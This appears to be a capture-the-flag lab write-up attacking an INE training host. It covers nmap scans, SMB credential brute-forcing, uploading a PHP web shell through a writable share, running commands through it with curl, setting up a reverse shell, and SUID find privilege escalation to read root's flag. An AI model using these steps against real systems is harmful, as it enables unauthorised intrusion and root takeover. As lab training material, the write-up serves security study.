# Enumeration
## nmap scan
```shell
# port scan
- nmap -sV -p- --min-rate 6000 target2.ine.local
	- 80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
	- 139/tcp open  netbios-ssn Samba smbd 4.6.2
	- 445/tcp open  netbios-ssn Samba smbd 4.6.2

# service scan
- sudo nmap -sS -sV -A -T4 -oX target2.xml target2.ine.local
	- PORT    STATE SERVICE     VERSION
	80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
	|_http-title: Can you Pwn me?
	|_http-server-header: Apache/2.4.41 (Ubuntu)
	139/tcp open  netbios-ssn Samba smbd 4.6.2
	445/tcp open  netbios-ssn Samba smbd 4.6.2
	
	Host script results:
	| smb2-time: 
	|   date: 2025-05-13T18:51:03
	|_  start_date: N/A
	|_nbstat: NetBIOS name: TARGET2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
	| smb2-security-mode: 
	|   3:1:1: 
	|_    Message signing enabled but not required

```

# Exploitation
## exploiting smb
server is misconfigure
```shell
# bruteforce smb 
- use smb_login # metasploit module
- crackmapexec 
-> got admin:admin

# now access it and we have file upload ability
- impacket-smbclient admin:admin@target2.ine.local
- shares
- use site-uploads
- ls
- put simple-backdoor.php
------------

# access url via browser or curl
- http://target2.ine.local/site-uploads/simple-backdoor.php?cmd=id

# got flag
curl 'http://target2.ine.local/site-uploads/simple-backdoor.php?cmd=cat+/*.txt'
<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->

<pre>FLAG3{80ef75f5dbea483dae1727ac53e8dcf2}
</pre>

```

# Post-Exploitation
## privesc
```shell
# get reverse shell
# -> go to revshells.com and set up ip/port and in payload list use pentest monkey php shell
# copy it and upload it using samba share 

# execute using curl or browse via firefox as done in exploitation task.

# Find all SUID/SGID executables
- find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
	-rwsr-xr-- 1 root messagebus 51344 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
	-rwxr-sr-x 1 root shadow 43160 Jan 10  2024 /usr/sbin/unix_chkpwd
	-rwxr-sr-x 1 root shadow 43168 Jan 10  2024 /usr/sbin/pam_extrausers_chkpwd
	-rwsr-xr-x 1 root root 85064 Feb  6  2024 /usr/bin/chfn
	-rwsr-xr-x 1 root root 68208 Feb  6  2024 /usr/bin/passwd
	-rwxr-sr-x 1 root shadow 84512 Feb  6  2024 /usr/bin/chage
	-rwxr-sr-x 1 root shadow 31312 Feb  6  2024 /usr/bin/expiry
	`-rwsr-xr-x 1 root root 320160 Feb 18  2020 /usr/bin/find`
	-rwsr-xr-x 1 root root 55528 Apr  9  2024 /usr/bin/mount
	-rwsr-xr-x 1 root root 53040 Feb  6  2024 /usr/bin/chsh
	-rwsr-xr-x 1 root root 88464 Feb  6  2024 /usr/bin/gpasswd
	-rwsr-xr-x 1 root root 44784 Feb  6  2024 /usr/bin/newgrp
	-rwsr-xr-x 1 root root 67816 Apr  9  2024 /usr/bin/su
	-rwsr-xr-x 1 root root 39144 Apr  9  2024 /usr/bin/umount
	-rwxr-sr-x 1 root crontab 43720 Feb 13  2020 /usr/bin/crontab 

# and we find find command
- cat /etc/shells
- find / -exec /bin/rbash -p \; -quit
- cat /root/flag4.txt
- FLAG4{91c86c861f004ef3b73d1fdf9650e8ab}
```